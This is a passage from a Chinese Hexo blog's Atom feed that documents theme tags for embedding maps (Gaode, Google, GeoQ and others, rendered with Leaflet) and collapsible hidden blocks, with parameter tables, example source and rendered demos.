style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">高德地图</td><td style="text-align:center">gaodeMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">百度地图</td><td style="text-align:center">baiduMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 4~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~2</td></tr><tr><td style="text-align:center">Geoq 地图</td><td style="text-align:center">geoqMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~5</td></tr><tr><td style="text-align:center">openstreet 地图</td><td style="text-align:center">openstreetMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">不支持此参数</td></tr></tbody></table><ol><li>参数之间，用英文逗号相隔</li><li>参数必须按上述事例顺序输入，不得为空</li><li>同一个页面，同一组经纬度值，只能插入一个相同标签值的地图 (若有需要，可以将第二个地图上，经度或纬度末尾删除一两个数)</li><li>参数取值必须在上述范围内</li><li>默认图层：即地图叠加层的值，默认常规地图还是卫星地图，可按地图显示顺序取值</li><li>缩放等级，数字越大，地图比例尺越小，显示的越精细</li><li>除标签值外，其他参数选填，但 每个参数的左边的参数必填</li><li>谷歌地图需要外网才能加载查看</li></ol><p>坐标获取：<a href="https://lbs.amap.com/tools/picker">高德地图坐标拾取系统</a> 、<a href="https://api.map.baidu.com/lbsapi/getpoint/index.html">百度地图坐标拾取系统</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% map 120.101101,30.239119 %&#125;</span><br><span class="line">&#123;% googleMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！ %&#125;</span><br><span class="line">&#123;% geoqMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！, 13, 90%, 320px, 3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div class="map-box" style="margin: 0.8rem 0 1.6rem 0;"><div id="map-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div></div><script type="text/javascript">var normalm=L.tileLayer.chinaProvider('GaoDe.Normal.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imgm=L.tileLayer.chinaProvider('GaoDe.Satellite.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imga=L.tileLayer.chinaProvider('GaoDe.Satellite.Annotion',{maxZoom:20,minZoom:1,attribution:'高德地图'});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:20,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'});routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1,attribution:'Google Maps'});var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:21,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm]),image=L.layerGroup([imgm,imga]);var baseLayers={"高德地图":normal,"智图地图":normalm1,"谷歌地图":normalMap,"高德卫星地图":imgm,"谷歌卫星地图":satelliteMap,"高德卫星标注":image,"谷歌卫星标注":routeMap};var mymap=L.map('map-120.101101-30.239119',{center:[30.239119,120.101101],zoom:14,layers:[normal],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="googleMap-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:22,minZoom:1,attribution:'Google Maps'});var baseLayers={"谷歌地图":normalMap,"谷歌卫星图":satelliteMap,"谷歌卫星标注": routeMap};var overlayLayers={};var mymap=L.map("googleMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:14,layers:[normalMap],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="geoqMap-120.101101-30.239119" style="max-width:90%; height:320px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm2=L.tileLayer.chinaProvider('Geoq.Normal.PurplishBlue',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm3=L.tileLayer.chinaProvider('Geoq.Normal.Gray',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm4=L.tileLayer.chinaProvider('Geoq.Normal.Warm',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm5=L.tileLayer.chinaProvider('Geoq.Theme.Hydro',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm1,normalm2,normalm3,normalm4,normalm5]);var baseLayers={"智图地图":normalm1,"午夜蓝":normalm2,"灰色":normalm3,"暖色":normalm4,"水系":normalm5};var mymap=L.map("geoqMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:13,layers:[normalm3],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-31-隐藏块">2.31 隐藏块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>content：要隐藏的内容</li><li>display：展示前按钮显示的文字（可选）</li><li>bg：按钮的背景颜色（可选）</li><li>color：按钮显示的文字的颜色（可选）</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock 点我预览, blue %&#125;</span><br><span class="line">这里有张图片：</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;image (1)&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:67%;&quot;</span> /&gt;</span></span></span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="hide-block"><button type="button" class="hide-button" style="background-color:  blue;">点我预览    </button><div class="hide-content"><p>这里有张图片：<br><img src="https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb" alt="image (1)" style="zoom:67%;" /></p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
    
    
    <summary type="html">🥧本文汇总Markdown格式以及外挂标签在网页端的渲染效果，可作为文档进行查询</summary>
    
    
    
    <category term="随记" scheme="https://nonevector.top/categories/%E9%9A%8F%E8%AE%B0/"/>
    
    
    <category term="Markdown" scheme="https://nonevector.top/tags/Markdown/"/>
    
    <category term="外挂标签" scheme="https://nonevector.top/tags/%E5%A4%96%E6%8C%82%E6%A0%87%E7%AD%BE/"/>
    
  </entry>
  
</feed>
